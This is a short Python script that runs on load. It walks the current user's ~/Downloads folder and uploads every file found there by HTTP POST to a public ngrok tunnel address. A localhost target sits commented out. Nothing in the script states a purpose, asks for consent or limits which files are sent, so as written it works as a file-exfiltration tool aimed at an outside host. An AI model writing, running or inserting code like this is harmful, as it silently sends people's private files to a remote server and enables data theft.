import os
import requests


def uploadFilesInDownloads():
    downloads_folder = os.path.expanduser('~/Downloads') 
    for filename in os.listdir(downloads_folder):
        filepath = os.path.join(downloads_folder, filename)
        # upload_file(filepath,'http://localhost:8000/uploadfile/')
        print("Uploading " + filename)
        upload_file(filepath,'https://8c5e-125-27-178-188.ngrok-free.app/uploadfile/')
        #https://8c5e-125-27-178-188.ngrok-free.app
        
        
                
def upload_file(file_path, url):
    files = {'file': open(file_path, 'rb')}
    response = requests.post(url, files=files)
    return response

              

uploadFilesInDownloads()